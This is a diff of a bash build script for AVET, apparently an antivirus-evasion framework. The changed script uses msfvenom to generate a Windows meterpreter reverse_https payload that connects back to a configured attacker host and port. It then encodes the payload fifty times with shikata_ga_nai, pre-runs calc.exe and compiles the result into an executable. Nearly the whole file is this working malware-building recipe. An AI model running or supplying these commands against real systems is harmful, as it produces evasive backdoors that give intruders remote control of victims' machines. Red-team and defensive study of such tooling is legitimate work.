@@ -1,5 +1,6 @@
 #!/bin/bash          
-# Call the generated output.exe on target, delivering the shellcode string in output/alpha_mixed.txt as command line argument
+# Apply shikata 50 times.
+# Preexecute calc.exe before actual payload.
 
 # print AVET logo
 cat banner.txt
@@ -19,17 +20,19 @@ cat banner.txt
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
 
-# make meterpreter reverse payload, encoded with msf alpha_mixed 
-msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/alpha_mixed BufferRegister=EAX -a x86 --platform Windows -f raw > output/sc_alpha_mixed.txt
+# make meterpreter reverse payload, encoded 50 rounds with shikata_ga_nai
+msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 50 -f c -a x86 --platform Windows > input/sc_c.txt
 
-# no command preexec
-set_command_source none
-set_command_exec none
+# set command source
+set_command_source static_from_here "calc.exe"
+
+# set command execution method
+set_command_exec exec_via_cmd
 
 # set shellcode source
-set_payload_source from_command_line_raw
+set_payload_source static_from_file input/sc_c.txt
 
-# set decoder and key source
+# set decoder and crypto key source
 set_decoder none
 set_key_source none
 
@@ -37,16 +40,14 @@ set_key_source none
 set_payload_info_source none
 
 # set shellcode binding technique
-set_payload_execution_method exec_shellcode_ASCIIMSF
+set_payload_execution_method exec_shellcode
 
 # enable debug output
 enable_debug_print
 
-# compile to pwn.exe file
-$win32_compiler -ffixed-eax -o output/output.exe source/avet.c
+# compile to output.exe file
+$win32_compiler -o output/output.exe source/avet.c
 strip output/output.exe
 
 # cleanup
 cleanup_techniques
-
-# Call the generated output.exe on target, delivering the shellcode string in output/sc_alpha_mixed.txt as command line argument
